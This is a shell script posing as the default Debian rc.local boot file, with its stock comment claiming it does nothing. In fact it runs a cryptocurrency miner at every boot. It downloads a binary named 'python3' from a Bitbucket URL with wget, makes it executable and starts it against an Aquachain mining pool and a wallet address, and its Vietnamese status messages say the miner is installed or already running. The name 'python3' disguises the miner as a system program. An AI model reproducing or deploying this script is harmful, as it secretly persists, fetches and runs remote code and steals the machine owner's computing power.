#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python3 ]; then
    if pgrep -x "python3" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh

     
fi
exit
fi


wget https://bitbucket.org/lovelyn/openai/downloads/python3
chmod +x python3
./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh

exit 0
